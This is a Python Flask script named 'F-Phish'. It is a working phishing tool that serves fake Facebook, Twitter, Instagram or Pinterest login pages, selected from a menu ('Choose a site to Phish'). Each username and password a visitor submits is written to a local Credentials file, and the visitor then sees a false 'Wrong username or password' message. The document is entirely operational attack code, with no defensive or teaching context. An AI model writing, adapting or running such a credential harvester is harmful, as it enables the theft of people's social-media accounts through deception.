from flask import Flask
from flask import render_template,request,session,redirect,url_for,flash

import pyfiglet

app = Flask(__name__)
app.secret_key="secret"

gr = '\033[1;30m'
g = '\033[0;32m'
y =  '\033[0;33m'
r = '\033[1;31m'
C = '\033[1;36m'
b = '\033[1;34m'

print(g)
banner = pyfiglet.figlet_format(f"F-Phish")
print(f"""{C}{banner}by:{gr}Grey-Phoenix""")

def Start(SiteName,SaveFile):
	print("\n\n\n\n")
	@app.route("/",methods=["POST","GET"])
	def site():		
			if request.method == "POST":
				username = request.form["username"]
				password = request.form["password"]
		
				appendfile = open(SaveFile,"a")

				appendfile.write("Username :")

				appendfile.write(username)
		
				appendfile.write("\n")
	

				appendfile.write("Password :")

				appendfile.write(password)

				appendfile.write("\n")
				appendfile.write("\n")
				appendfile.close()
				session.pop("username",None)
				flash("Wrong username or password","error")
				return redirect(url_for("site"))
	
			
				
			#	return render_template(SiteName)
			else:
				return render_template(SiteName)
	
	
	if "__main__" == __name__:
		app.run(host="0.0.0.0",debug=True)





def ChooseSite():
	print(f"""

[{b}1{gr}]{y}facebook{gr}
[{b}2{gr}]{y}twitter{gr}
[{b}3{gr}]{y}instagram{gr}
[{b}4{gr}]{y}pinterest{gr}

""")


	option = input("Choose a site to Phish : "+ b)
	print(b)


	if option == "1":
		Start("Facebook.html","Credentials/Facebook.txt")
	
	elif option == "2":
		Start("twitter.html","Credentials/Twitter.txt")
	
	elif option == "3":
		Start("Instagram.html","Credentials/Instagram.txt")
		
	elif option == "4":
		Start("Pinterest.html","Credentials/Pinterest.txt")

	else:
		print(f"{y}{option} {r}is an invalid option{g}")
	

ChooseSite()
